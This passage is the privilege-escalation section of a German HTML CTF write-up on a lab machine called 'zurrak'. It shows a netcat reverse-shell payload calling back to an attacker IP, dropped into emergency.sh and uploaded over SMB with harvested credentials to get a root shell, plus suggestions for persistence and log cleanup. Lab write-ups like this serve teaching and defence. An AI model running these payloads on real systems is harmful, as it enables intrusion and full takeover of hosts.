+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">smbclient \\\\127.0.0.1 -U emre%daily666 -c "put emergency.sh"</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Block zeigt den Befehl, um die zuvor erstellte `emergency.sh`-Datei (die den Reverse-Shell-Payload enthält) auf den lokalen SMB-Share `internal` hochzuladen.
+*   `smbclient \\\\127.0.0.1`: Verbindet sich zum SMB-Server auf dem Loopback-Interface (wie in `/etc/fstab` gesehen). Ein Share-Name wird nicht explizit angegeben, was implizieren könnte, dass `internal` ein Standard-Share ist oder der Benutzer `emre` automatisch dorthin verbunden wird (weniger wahrscheinlich). *Korrektur/Annahme:* Wahrscheinlich sollte hier `\\\\127.0.0.1\\internal` stehen, um den Share explizit anzugeben.
+*   `-U emre%daily666`: Verwendet die gefundenen Zugangsdaten.
+*   `-c "put emergency.sh"`: Führt den SMB-Befehl `put` aus, um die lokale Datei `emergency.sh` (die sich im aktuellen Verzeichnis des `postgres`-Benutzers befinden muss, z.B. `/tmp`) auf den Share hochzuladen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der entscheidende Schritt, um den im Admin-Panel beschriebenen Privesc-Mechanismus auszulösen. Durch das Hochladen der Datei `emergency.sh` in den erwarteten Share (`internal`) wird (hoffentlich) der "magic script" getriggert, der unsere Reverse Shell als `root` ausführt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stelle sicher, dass `emergency.sh` im richtigen lokalen Verzeichnis liegt und den korrekten Reverse-Shell-Payload enthält. Richte einen Listener (`nc -lvnp PORT`) auf deinem Angreifer-System auf dem Port ein, der in `emergency.sh` angegeben ist, *bevor* du diesen `smbclient`-Befehl ausführst. Führe den Befehl aus und warte auf die eingehende Root-Shell.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+[*] Trying to find binary 'bash' on the target machine
+[*] Found bash at /usr/bin/bash
+^[[200~nc 192.168.2.199 9005 -c sh
+^[[201~
+<span class="password">nc 192.168.2.199 9005 -c sh^J</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Teil scheint eine fehlerhafte Darstellung oder ein Artefakt aus der Shell-Interaktion zu sein. Die Zeilen mit `^[[200~` und `^[[201~` deuten oft auf Probleme mit der Terminal-Emulation oder Copy-Paste-Fehler hin (Bracketed Paste Mode). Die Zeile `nc 192.168.2.199 9005 -c sh` ist der eigentliche Reverse-Shell-Payload, der wahrscheinlich in die `emergency.sh` geschrieben werden sollte. Das `^J` am Ende repräsentiert einen Zeilenumbruch.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den Payload für die Reverse Shell, der in `emergency.sh` verwendet werden soll. Die Darstellung ist unsauber, aber die Absicht ist klar: eine Shell (`sh`) soll sich zurück zu `192.168.2.199` auf Port `9005` verbinden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stelle sicher, dass der Payload korrekt und ohne Steuerzeichen-Artefakte in `emergency.sh` geschrieben wird.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">postgres@zurrak:/tmp$ <span class="command">nano emergency.sh</span></div>
+                    <!-- nano editor UI not shown -->
+                     <div class="prompt">postgres@zurrak:/tmp$ <span class="command">cat emergency.sh</span></div>
+                    <pre>
+#!/bin/bash
+
+<span class="command">nc 192.168.2.199 9004 -c sh</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich erstelle die Datei `emergency.sh` im Verzeichnis `/tmp` (einem allgemein beschreibbaren Ort) mit dem Editor `nano`. Anschließend zeige ich den Inhalt mit `cat` an. Die Datei enthält den Shebang `#!/bin/bash` und den Reverse-Shell-Befehl `nc 192.168.2.199 9004 -c sh`. *Hinweis: Der Port wurde von 9005 auf 9004 geändert.*</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei `emergency.sh` ist nun korrekt mit dem Reverse-Shell-Payload erstellt. Der Port 9004 muss auf dem Angreifer-System abgehört werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mache die Datei ausführbar (`chmod +x emergency.sh`), obwohl dies für den `-c sh`-Parameter von `nc` nicht unbedingt nötig ist, aber gute Praxis sein kann. Fahre mit dem `smbclient put`-Befehl fort, um die Datei hochzuladen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">postgres@zurrak:/tmp$ <span class="command">smbclient \\\\127.0.0.1/internal -U emre%daily666 -c "put emergency.sh"</span></div>
+                    <pre>
+... <span class="password">(Ausgabe des erfolgreichen Uploads fehlt hier, aber der nächste Schritt impliziert Erfolg)</span> ...
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ich führe den Befehl aus, um die gerade erstellte `emergency.sh` aus `/tmp` auf den SMB-Share `internal` hochzuladen, wobei ich mich als `emre` mit dem Passwort `daily666` authentifiziere. Die genaue Erfolgsmeldung von `smbclient` fehlt in der Ausgabe, aber der Kontext legt nahe, dass der Upload funktioniert hat.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Upload wurde durchgeführt. Jetzt sollte der Trigger-Mechanismus ("magic script") auf dem Zielsystem die Datei erkennen und ausführen, was zur erhofften Reverse Shell führen sollte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfe den Listener auf dem Angreifer-System (Port 9004) auf eine eingehende Verbindung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9004</span></div>
+                    <pre>
+listening on [any] 9004 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.106] 44542</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Auf meinem Angreifer-System starte ich einen Netcat-Listener (`nc`) auf Port `9004`. `-l` für Listen-Modus, `-v` für ausführliche Ausgabe, `-n` um DNS-Auflösung zu vermeiden, `-p 9004` für den Port. Kurz nach dem Upload der `emergency.sh` geht eine Verbindung vom Zielsystem (`192.168.2.106`) ein.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Perfekt! Der Upload der `emergency.sh` hat den Mechanismus ausgelöst, und die Reverse Shell wurde erfolgreich hergestellt. Der entscheidende Schritt zur Rechteausweitung hat funktioniert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe Befehle wie `whoami` und `id` aus, um zu bestätigen, mit welchen Rechten die Shell läuft.</p>
+
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9004</span></div>
+                    <pre>
+listening on [any] 9004 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.106] 44542</span>
+<span class="command">whoami</span>
+<span class="password">root</span>
+<span class="command">id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> In der eingegangenen Reverse Shell führe ich die Befehle `whoami` und `id` aus. Die Ausgabe zeigt `root` bzw. `uid=0(root)`, was bestätigt, dass die durch `emergency.sh` gestartete Shell mit Root-Rechten läuft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch, die Rechteausweitung war erfolgreich! Wir haben nun vollständige Kontrolle über das Zielsystem als Benutzer `root`. Der Mechanismus mit `emergency.sh` auf dem SMB-Share war der Schlüssel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sichere den Root-Zugriff (z.B. durch Hinzufügen eines SSH-Schlüssels zu `/root/.ssh/authorized_keys`). Sammle die Flags (`user.txt`, `root.txt`). Führe abschließende Systemanalysen durch und dokumentiere den Angriffspfad.
+<br><strong>Empfehlung (Admin):</strong> Entfernen oder sichern Sie den Mechanismus, der `emergency.sh` ausführt, dringend! Untersuchen Sie, welches Skript oder welcher Dienst dies tut (z.B. Cronjob, Systemd-Timer, Inotify-Watcher) und deaktivieren oder korrigieren Sie es. Überprüfen Sie die SMB-Konfiguration und -Berechtigungen grundlegend. Ändern Sie alle kompromittierten Passwörter (`testsite`, `baller15`, `ilovecats`, `daily666`).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Prompt der Root-Shell auf dem Zielsystem -->
+                    <pre>
+<span class="command">cd /home</span>
+<span class="command">ls</span>
+<span class="command">postgres</span>
+<span class="command">cd postgres</span>
+<span class="command">ls</span>
+<span class="command">emergency.sh</span>
+<span class="command">user.txt</span>
+<span class="command">cat user.txt</span>
+<span class="password">fe8f97f109ceb0362c95e60338c4c1a8</span>
+
+<span class="command">cd /root</span>
+<span class="command">ls</span>
+<span class="command">bash_history</span>
+<span class="command">root.txt</span>
+<span class="command">cat root.txt</span>
+<span class="password">66fce7650a88ac2afd99d061e1c6a4df</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Als `root` navigiere ich zu den üblichen Speicherorten der Flags. Zuerst wechsle ich nach `/home`, liste den Inhalt auf (nur `postgres`), wechsle in `/home/postgres`, liste den Inhalt auf (finde die hochgeladene `emergency.sh` und die `user.txt`) und lese die `user.txt` mit `cat` aus. Danach wechsle ich in das Home-Verzeichnis von root (`/root`), liste den Inhalt auf (finde `.bash_history` und `root.txt`) und lese die `root.txt` mit `cat` aus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Beide Flags, `user.txt` und `root.txt`, wurden erfolgreich gefunden und ausgelesen. Das Ziel der Maschine ist damit erreicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dokumentiere die Flags und den Fundort. Führe gegebenenfalls eine Bereinigung durch (z.B. Löschen der `emergency.sh`, Entfernen von Logeinträgen oder hochgeladenen Tools, falls im Scope vereinbart).
+<br><strong>Empfehlung (Admin):</strong> Sichern Sie die Flag-Dateien (obwohl dies in CTF-Szenarien nicht üblich ist). Konzentrieren Sie sich auf die Behebung der Schwachstellen, die den Zugriff ermöglicht haben.</p>
+            <!-- Privilege Escalation Inhalt endet hier -->
+        </section>
+
+        <!-- Flags Section (Korrekte Struktur gemäß Regeln) -->
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/postgres/user.txt</div>
+                    <div class="flag-value"><span class="password">fe8f97f109ceb0362c95e60338c4c1a8</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">66fce7650a88ac2afd99d061e1c6a4df</span></div>
+                </div>
+            </div>
+        </section>
+        <!-- Ende Flags Section --> 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 23. November 2023</p> <!-- Datum eingefügt -->
+    </footer>
+</body>
+</html>
